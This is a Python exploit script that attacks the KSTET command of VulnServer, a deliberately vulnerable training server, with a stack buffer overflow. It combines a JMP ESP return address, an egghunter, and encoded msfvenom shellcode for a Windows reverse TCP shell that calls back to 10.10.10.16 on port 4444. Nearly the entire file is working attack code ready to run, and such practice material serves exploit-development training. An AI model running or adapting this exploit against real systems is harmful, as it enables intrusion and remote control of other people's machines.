#!/usr/bin/env python
"""
Description: Vanilla Buffer Overflow w/ egghunter via "KSTET" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 10/10/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""

import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# 0x625011AF| JMP ESP | essfunc.dll

jmp_esp = struct.pack("<I", 0x625011AF)

# nasm > add eax,byte +0x6
# 83C006
# nasm > jmp eax
# FFE0

stage2 = "\x90\x90\x83\xc0\x06\xff\xe0"

# d3rpd3rp egghunter                                                                                                 
# Length: 32 bytes

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x64\x33\x72\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_reverse_tcp LHOS=10.10.10.16 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f c

shellcode = ("\xba\x96\x7f\x42\x34\xdb\xdc\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\xc0\x71\xa0\xc1\x10\x65\xa6"
"\x2a\xe8\x76\xc7\xa3\x0d\x47\xc7\xd0\x46\xf8\xf7\x93\x0a\xf5"
"\x7c\xf1\xbe\x8e\xf1\xde\xb1\x27\xbf\x38\xfc\xb8\xec\x79\x9f"
"\x3a\xef\xad\x7f\x02\x20\xa0\x7e\x43\x5d\x49\xd2\x1c\x29\xfc"
"\xc2\x29\x67\x3d\x69\x61\x69\x45\x8e\x32\x88\x64\x01\x48\xd3"
"\xa6\xa0\x9d\x6f\xef\xba\xc2\x4a\xb9\x31\x30\x20\x38\x93\x08"
"\xc9\x97\xda\xa4\x38\xe9\x1b\x02\xa3\x9c\x55\x70\x5e\xa7\xa2"
"\x0a\x84\x22\x30\xac\x4f\x94\x9c\x4c\x83\x43\x57\x42\x68\x07"
"\x3f\x47\x6f\xc4\x34\x73\xe4\xeb\x9a\xf5\xbe\xcf\x3e\x5d\x64"
"\x71\x67\x3b\xcb\x8e\x77\xe4\xb4\x2a\xfc\x09\xa0\x46\x5f\x46"
"\x05\x6b\x5f\x96\x01\xfc\x2c\xa4\x8e\x56\xba\x84\x47\x71\x3d"
"\xea\x7d\xc5\xd1\x15\x7e\x36\xf8\xd1\x2a\x66\x92\xf0\x52\xed"
"\x62\xfc\x86\xa2\x32\x52\x79\x03\xe2\x12\x29\xeb\xe8\x9c\x16"
"\x0b\x13\x77\x3f\xa6\xee\x10\x4a\x3d\xfa\xf0\x22\x43\xfa\xe1"
"\xee\xca\x1c\x6b\x1f\x9b\xb7\x04\x86\x86\x43\xb4\x47\x1d\x2e"
"\xf6\xcc\x92\xcf\xb9\x24\xde\xc3\x2e\xc5\x95\xb9\xf9\xda\x03"
"\xd5\x66\x48\xc8\x25\xe0\x71\x47\x72\xa5\x44\x9e\x16\x5b\xfe"
"\x08\x04\xa6\x66\x72\x8c\x7d\x5b\x7d\x0d\xf3\xe7\x59\x1d\xcd"
"\xe8\xe5\x49\x81\xbe\xb3\x27\x67\x69\x72\x91\x31\xc6\xdc\x75"
"\xc7\x24\xdf\x03\xc8\x60\xa9\xeb\x79\xdd\xec\x14\xb5\x89\xf8"
"\x6d\xab\x29\x06\xa4\x6f\x59\x4d\xe4\xc6\xf2\x08\x7d\x5b\x9f"
"\xaa\xa8\x98\xa6\x28\x58\x61\x5d\x30\x29\x64\x19\xf6\xc2\x14"
"\x32\x93\xe4\x8b\x33\xb6")

buffer = "KSTET "
buffer += egghunter
buffer += "A"*38
buffer += jmp_esp
buffer += stage2
buffer += "C"*(200-38-len(egghunter)-len(jmp_esp)-len(stage2)-len(buffer))

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send("RTIME d3rpd3rp" + shellcode)
    s.close()
except:
    print "[+] Something went wrong :("

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(buffer)
    s.close()
except:
    print "[-] Something went wrong :("
